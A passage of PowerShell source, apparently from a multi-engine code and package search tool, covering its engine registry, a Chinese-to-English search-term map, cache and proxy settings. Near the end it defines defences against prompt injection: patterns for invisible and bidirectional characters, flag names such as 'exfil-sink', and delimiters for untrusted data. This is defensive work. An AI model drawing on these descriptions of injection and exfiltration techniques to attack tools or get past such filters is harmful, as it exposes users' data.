    @{ Name = 'Gitee';       Kind = 'repo'; Platforms = @('Gitee'); Host = 'so.gitee.com';        Func = 'Search-Gitee';       Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Set-EngineStatus','Add-EngineWarning','Invoke-GiteeV5Fallback') },
    # U-157：GitLab 的 Needs 增加 Add-EngineWarning（引擎失败分支新增了告警上报；runspace 需注入，否则取不到函数）
    @{ Name = 'GitLab';      Kind = 'repo'; Platforms = @('GitLab'); Host = 'gitlab.com';       Func = 'Search-GitLab';      Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'Codeberg';    Kind = 'repo'; Platforms = @('Codeberg'); Host = 'codeberg.org';     Func = 'Search-Codeberg';    Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'GitHubCode';  Kind = 'code'; Platforms = @('GitHubCode'); Host = 'api.github.com';   LangFilter = $true; SupportsRepoScope = $true; Func = 'Search-GitHubCode';  Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Wait-RateLimitToken','Set-EngineStatus','Get-EngineStatus','Test-RateLimit403','Add-EngineWarning','Get-HeaderValue') },
    # v1.46.9（T1-3）：SupportsRepoScope=true —— 只有**gitlab 宿主**才成立（项目级 /projects/:id/search），
    #   由 Get-CodeScopePlan 按宿主排除；Needs 补 Invoke-GitLabRepoScopedBlobs（runspace 内要能取到定义）。
    @{ Name = 'GitLabBlobs'; Kind = 'code'; Platforms = @('GitLabBlobs'); Host = 'gitlab.com';  SupportsRepoScope = $true; Func = 'Search-GitLabBlobs'; Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Add-EngineWarning','New-EngineEnvelope','Get-ApiRequestLedgerByEngine','Get-ApiLedgerRows','Invoke-GitLabProjectBlobSearch','Invoke-GitLabBlobDiscover','ConvertTo-GitLabBlobResults','Invoke-GitLabRepoScopedBlobs') },
    @{ Name = 'GrepApp';     Kind = 'code'; Platforms = @('grep.app'); Host = 'mcp.grep.app';     LangFilter = $true; SupportsRepoScope = $true; Func = 'Search-GrepApp';     Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Set-EngineStatus','Get-EngineStatus','Add-EngineWarning','Get-CodeRequestBudget','Get-EngineDeadlineOverride','ConvertFrom-GrepAppText') },
    # v1.39.0（归并 A 线 v1.36.0/v1.38.0）：SEExcerpts = 社区实现证据（问答片段），**不是代码索引命中**（语义见引擎链.md）。
    @{ Name = 'SEExcerpts';  Kind = 'code'; Platforms = @('SEExcerpts'); Host = 'api.stackexchange.com';   Func = 'Search-SEExcerpts'; Needs = @('Write-ColorOutput','Invoke-ApiRequest','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'Sourcegraph'; Kind = 'code'; Platforms = @('Sourcegraph'); Host = 'sourcegraph.com';  LangFilter = $true; SupportsRepoScope = $true; Func = 'Search-Sourcegraph'; Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Set-EngineStatus','Get-EngineStatus','Add-EngineWarning') },
    # B2-1（U-258）：HF 已迁 engine/1 封套 ⇒ Needs 去掉不再调用的 Set-EngineStatus，加 New-EngineEnvelope。
    #   ★Needs 是**实际依赖**清单，不是"历史调用过的函数集合"：多列一个 = 往每个 runspace 多塞一份函数体。
    @{ Name = 'HF';          Kind = 'research'; Platforms = @('HuggingFace'); Host = 'huggingface.co';   Func = 'Search-HuggingFace'; Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Add-EngineWarning','New-EngineEnvelope') },
    # ★U-243（v1.53.25，验收 B1-7）：原 `Packages`（一个引擎串行 npm→crates.io→Maven）拆成三个引擎。
    #   一个引擎 = 一个上游：单源挂死只牺牲它自己，其余照常交付（验收 02-架构设计-v2 §L2 隔离原则）。
    #   Platforms 保持原值（-Platform 只作用于 repo 路径，这里是给"零命中判定"与报告展示用）。
    @{ Name = 'Npm';         Kind = 'research'; Platforms = @('npm'); Host = 'registry.npmjs.org';          Func = 'Search-NpmRegistry';  Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning','Set-NpmDownloadStats') },
    @{ Name = 'Crates';      Kind = 'research'; Platforms = @('crates.io'); Host = 'crates.io';    Func = 'Search-CratesIo';     Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'Maven';       Kind = 'research'; Platforms = @('Maven'); Host = 'search.maven.org';        Func = 'Search-MavenCentral'; Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'RubyGems';    Kind = 'research'; Platforms = @('RubyGems'); Host = 'rubygems.org';      Func = 'Search-RubyGems';    Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'NuGet';       Kind = 'research'; Platforms = @('NuGet'); Host = 'azuresearch-usnc.nuget.org';         Func = 'Search-NuGet';       Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning') },
    # U-199（2026-10-21）：Packagist（PHP/Composer）—— 免 key，实测 200/0.74s/15 条（total 6453）。
    @{ Name = 'Packagist';   Kind = 'research'; Platforms = @('Packagist'); Host = 'packagist.org';     Func = 'Search-Packagist';   Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'DockerHub';   Kind = 'research'; Platforms = @('DockerHub'); Host = 'hub.docker.com';     Func = 'Search-DockerHub';   Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'arXiv';       Kind = 'research'; Platforms = @('arXiv'); Host = 'export.arxiv.org';         Func = 'Search-Arxiv';       Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'OpenAlex';    Kind = 'research'; Platforms = @('OpenAlex'); Host = 'api.openalex.org';       Func = 'Search-OpenAlex';    Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning','Get-HeaderValue') },
    @{ Name = 'MCPRegistry'; Kind = 'research'; Platforms = @('MCPRegistry'); Host = 'registry.modelcontextprotocol.io';   Func = 'Search-McpRegistry'; Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning') },
    @{ Name = 'HackerNews';  Kind = 'research'; Platforms = @('HackerNews'); Host = 'hn.algolia.com';     Func = 'Search-HackerNews';  Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus') },
    @{ Name = 'SE';          Kind = 'research'; Platforms = @('StackExchange'); Host = 'api.stackexchange.com';  Func = 'Search-StackExchange'; Needs = @('Write-ColorOutput','Get-ApiHeaders','Invoke-ApiRequest','Test-RateLimit403','Set-EngineStatus','Add-EngineWarning') },
    # v1.40.0（2026-10-17）：DeepSeek 网页搜索（DeepSeek 官方 Search API，**第三方付费服务、非本仓自研**，按成功请求计费）。
    #   可选付费源：未配置 DEEPSEEK_API_KEY 时由 Test-ResearchEngineAvailable 整体排除（不进 Requested），
    #   从而不改变既有用户的 Verdict；配置后自动纳入 research 聚合。
    @{ Name = 'DeepSeek';    Kind = 'research'; Platforms = @('DeepSeek'); Host = 'api.deepseek.com';       Func = 'Search-DeepSeek';    Needs = @('Write-ColorOutput','Invoke-ApiRequest','Add-EngineWarning','New-EngineEnvelope') }
)


# v1.53.16（2026-10-23 检索式准确度双修）：**打包词把主流库挤出 AND 召回；中文主题词抽不出来时 repo 只会按星数泛化**。
#   实测（本机 GitHub，-Limit 5 -NoCache，逐条可复现）：
#     「rust http client library」⇒ rust-http(已废弃 ★390) / nyquest / libsql-client-rs / vaultrs / databento-rs
#     「rust http client」        ⇒ reqwest ★11885 / h2 ★1556 / ureq ★2215
#     「向量数据库」              ⇒ document.ai / funNLP / x86-bare-metal-examples（与主题无关）
#     「vector database」         ⇒ milvus ★46462 / tidb / redis / quivr
#   口径：这张表只收「英文对应唯一 + 技术检索语境常见」的主题词，宁缺毋滥（同 AbbrevPhraseMap 的纪律）；
#   值是**检索词**不是译文，故一律小写、可多个词。加词前必须先用真实查询确认英文侧召回确实更准。
$script:ZhTopicTermMap = [ordered]@{
    # 运行时与并发
    '异步运行时'   = 'async runtime'
    '协程'         = 'coroutine'
    '线程池'       = 'thread pool'
    '连接池'       = 'connection pool'
    '内存池'       = 'memory pool'
    '无锁'         = 'lock free'
    '零拷贝'       = 'zero copy'
    '垃圾回收'     = 'garbage collection'
    '内存泄漏'     = 'memory leak'
    # 数据存储与检索
    '向量数据库'   = 'vector database'
    '向量检索'     = 'vector search'
    '图数据库'     = 'graph database'
    '时序数据库'   = 'time series database'
    '关系型数据库' = 'relational database'
    '键值存储'     = 'key value store'
    '对象存储'     = 'object storage'
    '全文检索'     = 'full text search'
    '倒排索引'     = 'inverted index'
    '数据湖'       = 'data lake'
    '数据仓库'     = 'data warehouse'
    '流处理'       = 'stream processing'
    '数据库迁移'   = 'database migration'
    '分库分表'     = 'sharding'
    '分布式事务'   = 'distributed transaction'
    '共识算法'     = 'consensus algorithm'
    '一致性哈希'   = 'consistent hashing'
    # 分布式与架构
    '消息队列'     = 'message queue'
    '发布订阅'     = 'pub sub'
    '事件驱动'     = 'event driven'
    '服务网格'     = 'service mesh'
    '微服务'       = 'microservice'
    '服务发现'     = 'service discovery'
    '配置中心'     = 'config center'
    '网关'         = 'gateway'
    '反向代理'     = 'reverse proxy'
    '负载均衡'     = 'load balancer'
    '限流'         = 'rate limit'
    '熔断'         = 'circuit breaker'
    '幂等'         = 'idempotent'
    '分布式锁'     = 'distributed lock'
    '分布式追踪'   = 'distributed tracing'
    '链路追踪'     = 'distributed tracing'
    '可观测性'     = 'observability'
    '日志聚合'     = 'log aggregation'
    '灰度发布'     = 'canary release'
    # 安全
    '认证授权'     = 'authentication authorization'
    '单点登录'     = 'single sign on'
    '权限控制'     = 'access control'
    '零信任'       = 'zero trust'
    # 测试与质量
    '单元测试'     = 'unit test'
    '端到端测试'   = 'end to end testing'
    '模糊测试'     = 'fuzz testing'
    '压力测试'     = 'load testing'
    '基准测试'     = 'benchmark'
    '静态分析'     = 'static analysis'
    '性能分析'     = 'profiler'
    '火焰图'       = 'flamegraph'
    # AI / 模型
    '大模型'       = 'large language model'
    '提示词'       = 'prompt engineering'
    '智能体'       = 'ai agent'
    '检索增强'     = 'retrieval augmented generation'
    '微调'         = 'fine tuning'
    '模型量化'     = 'quantization'
    '模型推理'     = 'model inference'
    '向量嵌入'     = 'embedding'
    '多模态'       = 'multimodal'
    # 文本 / 语言 / 编译
    '中文分词'     = 'chinese word segmentation'
    '分词'         = 'word segmentation'
    '正则表达式'   = 'regex'
    '模板引擎'     = 'template engine'
    '解析器'       = 'parser'
    '编译器'       = 'compiler'
    '虚拟机'       = 'virtual machine'
    # 前端 / 构建
    '前端框架'     = 'frontend framework'
    '状态管理'     = 'state management'
    '服务端渲染'   = 'server side rendering'
    '静态站点'     = 'static site generator'
    '组件库'       = 'component library'
    '构建工具'     = 'build tool'
    # 交付与运维
    '持续集成'     = 'continuous integration'
    '持续部署'     = 'continuous deployment'
    '容器编排'     = 'container orchestration'
    '定时任务'     = 'cron job'
    '任务调度'     = 'task scheduling'
    '工作流引擎'   = 'workflow engine'
    '规则引擎'     = 'rule engine'
    '状态机'       = 'state machine'
    '插件系统'     = 'plugin system'
    '热更新'       = 'hot reload'
}
# v1.21.0 P0-2 / U-141：-Doctor 工具全表。Exe 保留 Windows 显示兼容值；Names 才是平台无关的实际候选基名。
$script:doctorTools = @(
    @{ Exe = 'rg.exe';        Names = @('rg');               Label = 'ripgrep';  Role = '本地代码检索(primary)' }
    @{ Exe = 'ugrep.exe';     Names = @('ugrep');            Label = 'ugrep';    Role = '本地代码检索(fallback)' }
    @{ Exe = 'ast-grep.exe';  Names = @('ast-grep', 'sg');   Label = 'ast-grep'; Role = '本地结构化检索(需 -UseAstGrep)' }
    @{ Exe = 'aria2c.exe';    Names = @('aria2c');           Label = 'aria2';    Role = '多线程下载(可选)' }
    @{ Exe = 'fzf.exe';       Names = @('fzf');              Label = 'fzf';      Role = '交互选择(可选)' }
)
# v1.36.3：补 _rlBuckets/_rlLock —— Wait-RateLimitToken 读 $script:_rlBuckets/_rlLock，此前未注入 ⇒ Runspace 内为 $null 早退，
# 并发路径（-Platform All 默认）下 GitHub Search 令牌桶静默失效。二者为引用类型，按引用注入即跨 Runspace 共享同一桶与同一把锁。
# v1.36.5（回迁 B v1.34.1）：TLS 兜底所需的 node 可执行与引擎脚本路径在顶层解析一次并注入。
# 原因：Invoke-ApiRequest 在 Runspace 内经函数文本重建执行，PSScriptRoot 为空 ⇒ Join-Path 得相对路径 ⇒ Test-Path 失败 ⇒
# 并发路径（-Platform All / 研究模式默认）下 node --use-system-ca 兜底从未生效。二者为字符串，按值注入即可。
$script:NodeEnginePath = $null
try {
    $nodeEngineCand = Join-Path $ScriptDir 'tools\node-https-engine.mjs'
    if (Test-Path -LiteralPath $nodeEngineCand -PathType Leaf) { $script:NodeEnginePath = (Resolve-Path -LiteralPath $nodeEngineCand).ProviderPath }
} catch { }
$script:NodeExePath = $null
try {
    $script:NodeExePath = (Get-Command node -CommandType Application -ErrorAction SilentlyContinue | Select-Object -First 1).Source
} catch { }
$script:_injectVars = @('VERSION', 'CacheTTLSeconds', 'CacheFile', 'AsJson', 'Cfg', 'ProxyMode', '_sysProxyMode', '_engineRegistry', '_engineDeadlineOverride', '_engineDeadlineOverrideRaw', '_networkEngine', '_networkRoutes', '_networkFailures', '_networkHttpResponses', '_networkDeadHosts', '_proxyBreaker', '_routeTrace', '_engineStatus', '_engineStatusReason', '_engineWarnings', '_engineTimings', '_rlBuckets', '_rlLock', '_ledgerEngine', '_ledgerMode', '_ledgerOpen', 'NodeEnginePath', 'NodeExePath')   # U-261：账本归属是**每 runspace** 的标量（包装块逐个数覆盖），注入只为让名字在 runspace 里存在
# P4：进程内 LRU 缓存层（零依赖，叠在 search_cache.json 磁盘缓存之上）
# 作用：① 内存命中免磁盘 IO（同一进程内重复查询瞬时返回）② 容量上限避免内存/缓存文件无限膨胀
# v1.14.0 H3：写合并——Set-LruResult 只写内存并置 $script:_cacheDirty；主流程末尾 Flush-LruCache 统一落盘一次
# （此前每次 Set 都全量读改写 search_cache.json，高频检索 IO 放大；stale-while-revalidate 依赖的磁盘缓存由 flush 保证）。
$script:_lruCapacity = 200
$script:_lruCache = [ordered]@{}
$script:_cacheDirty = $false

# v1.47.2（P1-3）：**磁盘缓存回灌**。旧行为：`_lruCache` 进程内从空起步，而 `Flush-LruCache` 是
#   "内存 LRU 全集重写" ⇒ 每一轮都把上一轮的键整体删掉，实测连跑三次 `search_cache.json` entries 恒为 1
#   （磁盘缓存形同虚设，跨进程从未命中）。现在首次读写前把**未过期**条目回灌内存；Flush 仍按容量裁剪。
$script:_lruHydrated = $false
# R96（远端 R2）扩面：原集合漏了 Tag 块 U+E0000–E007F（ASCII 走私）、双向隔离 U+2066–2069（Trojan Source）、U+061C/180E、
#   Hangul 填充 115F/1160/3164/FFA0、行间注释锚 FFF9–FFFB、软连字符 00AD、未跟在汉字后的变体选择符补充区 U+E0100–E01EF。
#   白名单：RGI 旗帜 tag 序列（英格兰/苏格兰/威尔士 🏴 + gbeng/gbsct/gbwls + U+E007F）原样保留；汉字后的 IVS 保留（异体字）。
$script:RgiTagFlagPattern = '\uD83C\uDFF4\uDB40\uDC67\uDB40\uDC62(?:\uDB40\uDC65\uDB40\uDC6E\uDB40\uDC67|\uDB40\uDC73\uDB40\uDC63\uDB40\uDC74|\uDB40\uDC77\uDB40\uDC6C\uDB40\uDC73)\uDB40\uDC7F'
$script:InvisiblePattern = '[\u00AD\u061C\u115F\u1160\u180E\u200B-\u200F\u202A-\u202E\u2060-\u2064\u2066-\u206F\u3164\uFEFF\uFFA0\uFFF9-\uFFFB]|\uDB40[\uDC00-\uDC7F]|(?<![\u3400-\u9FFF\uF900-\uFAFF]|[\uD840-\uD87E][\uDC00-\uDFFF])\uDB40[\uDD00-\uDDEF]'
# ---------- R96（远端 R2，2026-09-30）：注入防御 —— 输入 5 类检测只标注；输出 4 条结构不变量 ----------
# 误报不对称：检测（指令短语/跨工具引用/外发 sink/编码块/同形字）一律只进 results[].Flags 与 metrics.InjectionFlags 计数，不删不改文字；
# 只有 4 条结构不变量可 hard-fail（门禁判红）：不可见码点残留 == 0 / 数据信封 schema（无 action/args/tool/sink 槽）/
# context 每个不可信块定界符计数 == 2 / 工具定义哈希不漂移（schema/mcp-tool.pin.json）。spotlighting 只是「降低」注入成功率，不是「消除」。
$script:InjectionFlagNames = @('invisible', 'hidden-comment', 'instruction-phrase', 'cross-tool-ref', 'exfil-sink', 'encoded-block', 'nfkc-variant', 'mixed-script')
# ⑦⑧ spotlighting（定界）：不可信文本放进带 nonce 的定界块；数据里出现的定界前缀先中和（<<< → ‹‹‹），保证每块恰好 2 个定界符。
$script:SpotlightOpen = '<<<UNTRUSTED-DATA'
$script:SpotlightClose = '<<<END-UNTRUSTED-DATA'
# 对进程级代理无效 ⇒ 企业环境下"以为直连、其实走了代理"的静默偏差，且 12e（连接被拒判据）随调用环境可红可绿。
# 修法：Core ⇒ Invoke-WebRequest -NoProxy（HttpClientHandler.UseProxy=false，环境变量与系统代理都不用）；
#       Desktop ⇒ 调用期间把 DefaultWebProxy 临时置为空代理（直连），finally 复原（不动系统设置、不动进程环境变量）。
# 观测：$script:LastRequestProxyMode ∈ direct-noproxy-core | direct-emptyproxy-desktop | default，供 12e 断言与 -Doctor 打印。
$script:LastRequestProxyMode = 'n/a'
